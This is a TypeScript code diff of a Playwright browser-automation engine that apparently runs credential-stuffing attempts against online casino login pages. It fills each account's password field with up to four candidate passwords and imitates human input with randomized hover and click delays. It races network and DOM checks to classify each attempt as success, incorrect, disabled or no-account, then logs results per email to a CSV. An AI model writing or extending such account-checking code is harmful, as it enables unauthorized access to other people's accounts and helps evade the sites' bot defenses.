+    this.log("INFO", `  ${site.name}: batch ${batchIndex} · ${hasAltPw ? "multi-password" : "single + fallbacks"} \u2014 ${passwords.length} attempts`);
 
-  if (response === "tempdisabled") {
-    throw new TempDisabledError();
-  }
+    // ── Password retry loop ──
+    for (let attemptIdx = 0; attemptIdx < passwords.length; attemptIdx++) {
+      const pw = passwords[attemptIdx];
+      const attemptNum = attemptIdx + 1;
+      const isRetry = attemptIdx === 3; // 4th attempt is a re-press of same password
 
-  if (response === "other") {
-    // No "incorrect" detected — login flow completed
-    this.log("OK", `  ${site.name}: no error detected after attempt ${attemptNum} \u2014 success`);
-    return { outcome: "success", attempts: attemptNum };
-  }
+      if (!isRetry) {
+        // Fill password field with new password (fast autofill)
+        await page.fill(selectors.password, pw);
+        await this.sleep(500);
+        this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: ${pw.substring(0, 3)}***`);
+      } else {
+        this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: re-pressing login`);
+      }
 
-  // response === "incorrect" or "timeout"
-  if (attemptNum < 4) {
-    this.log("WARN", `  ${site.name}: ${response} on attempt ${attemptNum} \u2014 trying next password`);
-  } else {
-    // 4th attempt still incorrect/timeout \u2192 no_account
-    this.log("WARN", `  ${site.name}: ${response} on attempt 4 \u2014 confirmed no_account`);
-    return { outcome: "noaccount", attempts: attemptNum };
-  }
-}
+      // ── Final cookie check right before first submit (catches late banners) ──
+      if (attemptIdx === 0) {
+        await this.dismissCookieNotice(page, site.name);
+      }
 
-// Should not reach here, but safety fallback
-return { outcome: "noaccount", attempts: passwords.length };
+      // ── Reset detection state before submit (race starts on click) ──
+      resetNetworkDetection();
+      await page.evaluate(() => { (window as any).__casinoStatus = null; }).catch(() => { });
+
+      // ── Press login button with human hover ──
+      await page.hover(selectors.submit);
+      await this.sleep(100 + Math.random() * 200);
+      await page.click(selectors.submit, { delay: 30 + Math.random() * 50 });
+
+      // ── Fast-poll race: network trap + Shadow-DOM observer (500ms window) ──
+      // Catches verdicts before tab redirects/closes on success or error overlays
+      let fastStatus: LoginResponse | null = null;
+      const pollStart = Date.now();
+      const uiRace = page.waitForFunction(
+        () => (window as any).__casinoStatus,
+        null,
+        { timeout: 500, polling: 25 }
+      ).then(async (h) => (await h.jsonValue()) as LoginResponse).catch(() => null);
+      while (Date.now() - pollStart < 500) {
+        if (page.isClosed()) break;
+        const net = getNetworkDetection();
+        if (net) { fastStatus = net; break; }
+        await new Promise((r) => setTimeout(r, 5));
+      }
+      if (!fastStatus) fastStatus = (await uiRace) || getNetworkDetection();
+      if (fastStatus) {
+        this.log("INFO", `  ${site.name}: fast-detected "${fastStatus}" in ${Date.now() - pollStart}ms`);
+      }
+
+      // ── Fall back to slower DOM scan if fast race didn't catch anything ──
+      const timeout = attemptIdx === 2 ? 5000 : 15000;
+      const response: LoginResponse = fastStatus || await this.waitForLoginResponse(page, timeout);
+
+      // ── Screenshot after response ──
+      await this.sleep(500);
+      await this.captureScreenshot(page, `${site.name}:attempt-${attemptNum}-${response}`);
+
+      // ── Handle response ──
+      if (response === "disabled") {
+        throw new PermDisabledError();
+      }
+
+      if (response === "tempdisabled") {
+        throw new TempDisabledError();
+      }
+
+      // response === "incorrect", "timeout", or "other"
+      if (attemptNum < 4) {
+        this.log("WARN", `  ${site.name}: ${response} on attempt ${attemptNum} \u2014 trying next password`);
+      } else {
+        // 4th attempt still incorrect/timeout \u2192 no_account
+        this.log("WARN", `  ${site.name}: ${response} on attempt 4 \u2014 confirmed no_account`);
+        return { outcome: "noaccount", attempts: attemptNum };
+      }
+    }
+
+    // Should not reach here, but safety fallback
+    return { outcome: "noaccount", attempts: passwords.length };
   }
 
   /** Site-specific cookie selectors (calibrated per target) */
   private static readonly SITE_COOKIE_SELECTORS: { [site: string]: string[] } = {
-  joe: [
-    'button:has-text("ACCEPT ALL")',
-    'button:has-text("Accept All")',
-    'button:has-text("Accept all")',
-  ],
+    joe: [
+      'button:has-text("ACCEPT ALL")',
+      'button:has-text("Accept All")',
+      'button:has-text("Accept all")',
+    ],
     ignition: [
       'button:has-text("ACCEPT ALL")',
       'button:has-text("Accept All")',
@@ -757,229 +707,236 @@ return { outcome: "noaccount", attempts: passwords.length };
 
   /** Generic fallback cookie selectors */
   private static readonly GENERIC_COOKIE_SELECTORS = [
-  'button:has-text("Accept")',
-  'button:has-text("Accept Cookies")',
-  'button:has-text("Allow All")',
-  'button:has-text("Allow all")',
-  'button:has-text("Agree")',
-  'button:has-text("I Agree")',
-  'button:has-text("Got it")',
-  'button:has-text("OK")',
-  'a:has-text("Accept")',
-  'a:has-text("Accept All")',
-  '#onetrust-accept-btn-handler',
-  '#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll',
-  '#cookie-accept',
-  '#accept-cookies',
-  '#acceptCookies',
-  '#gdpr-accept',
-  '.cookie-accept',
-  '.accept-cookies',
-  '[aria-label="Accept"]',
-  '[aria-label="Accept All"]',
-  '[aria-label="Accept cookies"]',
-  '[data-action="accept"]',
-  '[data-cookie-accept]',
-  '[data-testid="cookie-accept"]',
-];
+    'button:has-text("Accept")',
+    'button:has-text("Accept Cookies")',
+    'button:has-text("Allow All")',
+    'button:has-text("Allow all")',
+    'button:has-text("Agree")',
+    'button:has-text("I Agree")',
+    'button:has-text("Got it")',
+    'button:has-text("OK")',
+    'a:has-text("Accept")',
+    'a:has-text("Accept All")',
+    '#onetrust-accept-btn-handler',
+    '#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll',
+    '#cookie-accept',
+    '#accept-cookies',
+    '#acceptCookies',
+    '#gdpr-accept',
+    '.cookie-accept',
+    '.accept-cookies',
+    '[aria-label="Accept"]',
+    '[aria-label="Accept All"]',
+    '[aria-label="Accept cookies"]',
+    '[data-action="accept"]',
+    '[data-cookie-accept]',
+    '[data-testid="cookie-accept"]',
+  ];
 
   /** Dismiss cookie consent banners — site-specific first, generic fallback */
-  private async dismissCookieNotice(page: Page, siteName: string): Promise < void> {
-  // Try site-specific selectors first (fast path)
-  const siteSelectors = AutomationEngine.SITE_COOKIE_SELECTORS[siteName] || [];
-  for(const selector of siteSelectors) {
-    try {
-      const btn = page.locator(selector).first();
-      if (await btn.isVisible({ timeout: 300 })) {
-        await btn.click();
-        this.log("INFO", `  🍪 Dismissed cookie notice via calibrated: ${selector}`);
-        await this.sleep(500);
-        return;
+  private async dismissCookieNotice(page: Page, siteName: string): Promise<void> {
+    // Try site-specific selectors first (fast path)
+    const siteSelectors = AutomationEngine.SITE_COOKIE_SELECTORS[siteName] || [];
+    for (const selector of siteSelectors) {
+      try {
+        const btn = page.locator(selector).first();
+        if (await btn.isVisible({ timeout: 300 })) {
+          await btn.click();
+          this.log("INFO", `  🍪 Dismissed cookie notice via calibrated: ${selector}`);
+          await this.sleep(500);
+          return;
+        }
+      } catch {
+        // Selector didn't match — try next
       }
-    } catch {
-      // Selector didn't match — try next
     }
-  }
 
     // Fallback to generic selectors
-    for(const selector of AutomationEngine.GENERIC_COOKIE_SELECTORS) {
-  try {
-    const btn = page.locator(selector).first();
-    if (await btn.isVisible({ timeout: 200 })) {
-      await btn.click();
-      this.log("INFO", `  🍪 Dismissed cookie notice via fallback: ${selector}`);
-      await this.sleep(500);
-      return;
+    for (const selector of AutomationEngine.GENERIC_COOKIE_SELECTORS) {
+      try {
+        const btn = page.locator(selector).first();
+        if (await btn.isVisible({ timeout: 200 })) {
+          await btn.click();
+          this.log("INFO", `  🍪 Dismissed cookie notice via fallback: ${selector}`);
+          await this.sleep(500);
+          return;
+        }
+      } catch {
+        // Selector didn't match — try next
+      }
     }
-  } catch {
-    // Selector didn't match — try next
-  }
-}
   }
 
-  /** Capture a screenshot and emit it as a log event */
-  private async captureScreenshot(page: Page, label: string): Promise < void> {
-  try {
-    const b64 = await page.screenshot({ type: "jpeg", quality: 70 }).then((buf) => buf.toString("base64"));
-    this.emit("screenshot", { label, base64: b64, timestamp: new Date().toISOString() });
-    this.log("SNAP", `📸 ${label}`);
-  } catch {
-    this.log("WARN", `Screenshot failed: ${label}`);
+  /** Capture a screenshot, save to disk under screenshots/, and emit it as a log event */
+  private async captureScreenshot(page: Page, label: string): Promise<void> {
+    try {
+      const buf = await page.screenshot({ type: "jpeg", quality: 70 });
+      const b64 = buf.toString("base64");
+      const dir = path.join(process.cwd(), "screenshots");
+      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+      const ts = new Date().toISOString().replace(/[:.]/g, "-");
+      const safeLabel = label.replace(/[^a-zA-Z0-9._-]+/g, "_");
+      const filePath = path.join(dir, `${ts}_${safeLabel}.jpg`);
+      fs.writeFileSync(filePath, buf);
+      this.emit("screenshot", { label, base64: b64, timestamp: new Date().toISOString(), path: filePath });
+      this.log("SNAP", `📸 ${label} → ${path.relative(process.cwd(), filePath)}`);
+    } catch {
+      this.log("WARN", `Screenshot failed: ${label}`);
+    }
   }
-}
 
   private writeResultsCSV(targets: SiteConfig[]): void {
-  const header = "email,site,outcome,attempts,sessionId,recordingUrl,error";
-  const lines = [header];
-  for(const row of this.rows) {
-  for (const target of targets) {
-    const s = row.sites[target.name];
-    const err = this.stripAnsi((s.error || "").replace(/"/g, "'").replace(/[\r\n]+/g, " ")).substring(0, 200);
-    lines.push(
-      `${row.email},${target.name},${s.outcome},${s.attempts},${row.sessionId || ""},${row.recordingUrl || ""},"${err}"`
-    );
-  }
-}
-fs.writeFileSync("results.csv", lines.join("\n"), "utf-8");
-this.log("INFO", `Results saved to results.csv`);
+    const header = "email,site,outcome,attempts,sessionId,recordingUrl,error";
+    const lines = [header];
+    for (const row of this.rows) {
+      for (const target of targets) {
+        const s = row.sites[target.name];
+        const err = this.stripAnsi((s.error || "").replace(/"/g, "'").replace(/[\r\n]+/g, " ")).substring(0, 200);
+        lines.push(
+          `${row.email},${target.name},${s.outcome},${s.attempts},${row.sessionId || ""},${row.recordingUrl || ""},"${err}"`
+        );
+      }
+    }
+    fs.writeFileSync("results.csv", lines.join("\n"), "utf-8");
+    this.log("INFO", `Results saved to results.csv`);
   }
 
   /** Write a single row's results to CSV incrementally (append mode, write header on first row) */
   private writeRowResultCSV(targets: SiteConfig[], row: RowStatus, isFirst: boolean): void {
-  try {
-    const header = "email,site,outcome,attempts,sessionId,recordingUrl,error";
-    const lines: string[] = [];
-    if(isFirst) lines.push(header);
-    for(const target of targets) {
-      const s = row.sites[target.name];
-      const err = this.stripAnsi((s.error || "").replace(/"/g, "'").replace(/[\r\n]+/g, " ")).substring(0, 200);
-      lines.push(
-        `${row.email},${target.name},${s.outcome},${s.attempts},${row.sessionId || ""},${row.recordingUrl || ""},"${err}"`
-      );
-    }
+    try {
+      const header = "email,site,outcome,attempts,sessionId,recordingUrl,error";
+      const lines: string[] = [];
+      if (isFirst) lines.push(header);
+      for (const target of targets) {
+        const s = row.sites[target.name];
+        const err = this.stripAnsi((s.error || "").replace(/"/g, "'").replace(/[\r\n]+/g, " ")).substring(0, 200);
+        lines.push(
+          `${row.email},${target.name},${s.outcome},${s.attempts},${row.sessionId || ""},${row.recordingUrl || ""},"${err}"`
+        );
+      }
       fs.appendFileSync("results.csv", (isFirst ? "" : "\n") + lines.join("\n"), "utf-8");
-  } catch {
-    this.log("WARN", `Failed to write incremental result for ${row.email}`);
+    } catch {
+      this.log("WARN", `Failed to write incremental result for ${row.email}`);
+    }
   }
-}
 
   private emitRowUpdate(idx: number): void {
-  this.emit("row-update", JSON.parse(JSON.stringify(this.rows[idx])));
-}
+    this.emit("row-update", JSON.parse(JSON.stringify(this.rows[idx])));
+  }
 
   private log(level: string, message: string): void {
-  this.emit("log", {
-    level,
-    message,
-    timestamp: new Date().toISOString(),
-  });
-}
+    this.emit("log", {
+      level,
+      message,
+      timestamp: new Date().toISOString(),
+    });
+  }
 
-  private sleep(ms: number): Promise < void> {
-  return new Promise((r) => setTimeout(r, ms));
-}
+  private sleep(ms: number): Promise<void> {
+    return new Promise((r) => setTimeout(r, ms));
+  }
 
   /** Strip ANSI escape codes from strings */
   private stripAnsi(str: string): string {
-  return str.replace(/\u001b\[[0-9;]*m/g, "");
-}
+    return str.replace(/\u001b\[[0-9;]*m/g, "");
+  }
 
   /** Parse a single CSV line respecting quoted fields (RFC 4180 compatible, accepts both formats) */
   private parseCsvLine(line: string): string[] {
-  const fields: string[] = [];
-  let current = "";
-  let inQuotes = false;
-  for (let i = 0; i < line.length; i++) {
-    const ch = line[i];
-    if (inQuotes) {
-      if (ch === '"') {
-        if (i + 1 < line.length && line[i + 1] === '"') {
-          current += '"';
-          i++; // skip escaped quote
+    const fields: string[] = [];
+    let current = "";
+    let inQuotes = false;
+    for (let i = 0; i < line.length; i++) {
+      const ch = line[i];
+      if (inQuotes) {
+        if (ch === '"') {
+          if (i + 1 < line.length && line[i + 1] === '"') {
+            current += '"';
+            i++; // skip escaped quote
+          } else {
+            inQuotes = false;
+          }
         } else {
-          inQuotes = false;
+          current += ch;
         }
       } else {
-        current += ch;
-      }
-    } else {
-      if (ch === '"') {
-        inQuotes = true;
-      } else if (ch === ",") {
-        fields.push(current);
-        current = "";
-      } else {
-        current += ch;
+        if (ch === '"') {
+          inQuotes = true;
+        } else if (ch === ",") {
+          fields.push(current);
+          current = "";
+        } else {
+          current += ch;
+        }
       }
     }
+    fields.push(current);
+    return fields;
   }
-  fields.push(current);
-  return fields;
-}
 
   /**
    * Resolve selectors for a site — try configured selectors first,
    * auto-detect visible inputs as fallback when page loaded but selectors changed.
    */
   private async resolveSelectors(
-  page: Page,
-  site: SiteConfig
-): Promise < { username: string; password: string; submit: string } > {
-  // Try configured selectors
-  try {
-    const [uVis, pVis, sVis] = await Promise.all([
-      page.locator(site.selectors.username).first().isVisible({ timeout: 2000 }).catch(() => false),
-      page.locator(site.selectors.password).first().isVisible({ timeout: 2000 }).catch(() => false),
-      page.locator(site.selectors.submit).first().isVisible({ timeout: 2000 }).catch(() => false),
-    ]);
-    if(uVis && pVis && sVis) {
-  this.log("INFO", `  ${site.name}: configured selectors found`);
-  return site.selectors;
-}
-this.log("WARN", `  ${site.name}: configured selectors missing (user=${uVis} pass=${pVis} submit=${sVis}) \u2014 auto-detecting...`);
+    page: Page,
+    site: SiteConfig
+  ): Promise<{ username: string; password: string; submit: string }> {
+    // Try configured selectors
+    try {
+      const [uVis, pVis, sVis] = await Promise.all([
+        page.locator(site.selectors.username).first().isVisible({ timeout: 2000 }).catch(() => false),
+        page.locator(site.selectors.password).first().isVisible({ timeout: 2000 }).catch(() => false),
+        page.locator(site.selectors.submit).first().isVisible({ timeout: 2000 }).catch(() => false),
+      ]);
+      if (uVis && pVis && sVis) {
+        this.log("INFO", `  ${site.name}: configured selectors found`);
+        return site.selectors;
+      }
+      this.log("WARN", `  ${site.name}: configured selectors missing (user=${uVis} pass=${pVis} submit=${sVis}) \u2014 auto-detecting...`);
     } catch {
-  this.log("WARN", `  ${site.name}: selector check failed \u2014 auto-detecting...`);
-}
+      this.log("WARN", `  ${site.name}: selector check failed \u2014 auto-detecting...`);
+    }
 
-// Auto-detect fallback
-const usernameCandidates = [
-  'input[type="email"]', 'input[type="text"]', 'input[name="email"]',
-  'input[name="username"]', 'input[placeholder*="mail" i]', 'input[placeholder*="user" i]',
-  'input[autocomplete="email"]', 'input[autocomplete="username"]',
-];
-const passwordCandidates = [
-  'input[type="password"]', 'input[name="password"]',
-];
-const submitCandidates = [
-  'button[type="submit"]', 'input[type="submit"]',
-  'button:has-text("Log In")', 'button:has-text("Login")',
-  'button:has-text("Sign In")', 'button:has-text("LOG IN")',
-  'button:has-text("SIGN IN")',
-];
+    // Auto-detect fallback
+    const usernameCandidates = [
+      'input[type="email"]', 'input[type="text"]', 'input[name="email"]',
+      'input[name="username"]', 'input[placeholder*="mail" i]', 'input[placeholder*="user" i]',
+      'input[autocomplete="email"]', 'input[autocomplete="username"]',
+    ];
+    const passwordCandidates = [
+      'input[type="password"]', 'input[name="password"]',
+    ];
+    const submitCandidates = [
+      'button[type="submit"]', 'input[type="submit"]',
+      'button:has-text("Log In")', 'button:has-text("Login")',
+      'button:has-text("Sign In")', 'button:has-text("LOG IN")',
+      'button:has-text("SIGN IN")',
+    ];
 
-const username = await this.findFirstVisible(page, usernameCandidates);
-const password = await this.findFirstVisible(page, passwordCandidates);
-const submit = await this.findFirstVisible(page, submitCandidates);
+    const username = await this.findFirstVisible(page, usernameCandidates);
+    const password = await this.findFirstVisible(page, passwordCandidates);
+    const submit = await this.findFirstVisible(page, submitCandidates);
 
-if (!username || !password || !submit) {
-  throw new Error(`Auto-detect failed for ${site.name}: username=${!!username} password=${!!password} submit=${!!submit}`);
-}
+    if (!username || !password || !submit) {
+      throw new Error(`Auto-detect failed for ${site.name}: username=${!!username} password=${!!password} submit=${!!submit}`);
+    }
 
-this.log("INFO", `  ${site.name}: auto-detected selectors: ${username}, ${password}, ${submit}`);
-return { username, password, submit };
+    this.log("INFO", `  ${site.name}: auto-detected selectors: ${username}, ${password}, ${submit}`);
+    return { username, password, submit };
   }
 
   /** Find the first visible element from a list of candidate selectors */
-  private async findFirstVisible(page: Page, candidates: string[]): Promise < string | null > {
-  for(const sel of candidates) {
-    try {
-      if (await page.locator(sel).first().isVisible({ timeout: 500 })) {
-        return sel;
+  private async findFirstVisible(page: Page, candidates: string[]): Promise<string | null> {
+    for (const sel of candidates) {
+      try {
+        if (await page.locator(sel).first().isVisible({ timeout: 500 })) {
+          return sel;
+        }
+      } catch {
+        // not found
       }
-    } catch {
-      // not found
     }
-  }
     return null;
-}
+  }
 }
